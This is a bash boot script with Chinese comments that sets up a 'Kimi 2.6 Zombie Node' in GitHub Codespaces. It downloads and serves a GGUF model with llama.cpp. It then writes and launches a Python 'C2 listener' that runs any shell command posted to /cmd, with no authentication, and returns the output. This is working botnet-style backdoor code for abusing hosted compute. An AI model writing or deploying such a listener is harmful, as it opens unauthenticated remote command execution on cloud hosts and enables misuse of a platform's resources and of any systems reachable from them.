#!/bin/bash
# boot.sh - 在 Codespace 启动时运行，下载 Kimi 2.6 并启动 API 服务

set -e

echo "[+] Kimi 2.6 Zombie Node booting..."
echo "[+] Codespace URL: https://${CODESPACE_NAME}-8080.${GITHUB_CODESPACES_PORT_FORWARDING_DOMAIN}"

# 1. 安装依赖
echo "[+] Installing system dependencies..."
sudo apt-get update -qq
sudo apt-get install -y -qq git-lfs curl wget build-essential python3-pip

# 2. 安装 Hugging Face Hub CLI
echo "[+] Installing huggingface-hub..."
pip3 install --quiet huggingface-hub[cli] transformers accelerate torch

# 3. 设置 Git LFS 并下载模型（使用 GGUF 量化版，~20-30GB）
echo "[+] Downloading Kimi K2.6 GGUF model..."
export HF_HUB_ENABLE_HF_TRANSFER=1

# 如果设置了 HF_TOKEN，使用 token 下载（避免限流）
if [ -n "$HF_TOKEN" ]; then
    huggingface-cli download "$KIMI_MODEL" "Kimi-K2.6-${KIMI_QUANT}.gguf" \
        --local-dir ./model --local-dir-use-symlinks False \
        --token "$HF_TOKEN"
else
    huggingface-cli download "$KIMI_MODEL" "Kimi-K2.6-${KIMI_QUANT}.gguf" \
        --local-dir ./model --local-dir-use-symlinks False
fi

echo "[+] Model downloaded to ./model/"

# 4. 启动 Kimi API 服务（使用 llama.cpp 或 transformers）
echo "[+] Starting Kimi API server on port $API_PORT..."

# 方式 A：使用 llama.cpp（推荐，资源占用低）
# 需要先编译 llama.cpp，这里用预编译版本
if [ ! -f "./llama.cpp/build/bin/llama-server" ]; then
    echo "[+] Building llama.cpp..."
    git clone --depth 1 https://github.com/ggerganov/llama.cpp.git
    cd llama.cpp
    mkdir -p build && cd build
    cmake .. -DLLAMA_CUBLAS=OFF -DLLAMA_METAL=OFF -DCMAKE_BUILD_TYPE=Release
    make -j$(nproc) llama-server
    cd ../..
fi

# 启动 llama-server 作为后台服务
nohup ./llama.cpp/build/bin/llama-server \
    --model "./model/Kimi-K2.6-${KIMI_QUANT}.gguf" \
    --host 0.0.0.0 \
    --port "$API_PORT" \
    --ctx-size 8192 \
    --n-gpu-layers 0 \
    --alias "Kimi-Zombie-$(hostname)" \
    > /tmp/kimi-api.log 2>&1 &

# 5. 启动 C2 控制监听器（接收来自主控的命令）
echo "[+] Starting C2 listener on port $C2_PORT..."

cat > /tmp/c2_listener.py << 'EOF'
#!/usr/bin/env python3
import json
import subprocess
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

class C2Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/cmd':
            length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(length)
            try:
                cmd = json.loads(body).get('command', '')
                if cmd:
                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)
                    response = {'status': 'ok', 'stdout': result.stdout, 'stderr': result.stderr}
                else:
                    response = {'status': 'error', 'message': 'no command'}
            except Exception as e:
                response = {'status': 'error', 'message': str(e)}
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps(response).encode())

    def do_GET(self):
        if self.path == '/health':
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'status': 'alive', 'model': 'kimi-2.6'}).encode())

    def log_message(self, format, *args):
        pass  # 安静运行

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 5000
server = HTTPServer(('0.0.0.0', PORT), C2Handler)
print(f'[+] C2 listener running on port {PORT}')
server.serve_forever()
EOF

nohup python3 /tmp/c2_listener.py "$C2_PORT" > /tmp/c2.log 2>&1 &

# 6. 输出节点信息
echo ""
echo "=========================================="
echo "[✓] Kimi 2.6 Zombie Node is READY!"
echo "------------------------------------------"
echo "  API Endpoint: https://${CODESPACE_NAME}-${API_PORT}.${GITHUB_CODESPACES_PORT_FORWARDING_DOMAIN}"
echo "  C2 Endpoint:  https://${CODESPACE_NAME}-${C2_PORT}.${GITHUB_CODESPACES_PORT_FORWARDING_DOMAIN}"
echo "  Live URL:     https://${CODESPACE_NAME}.github.dev"
echo "=========================================="
echo ""
echo "[+] Monitor logs:"
echo "    tail -f /tmp/kimi-api.log"
echo "    tail -f /tmp/c2.log"
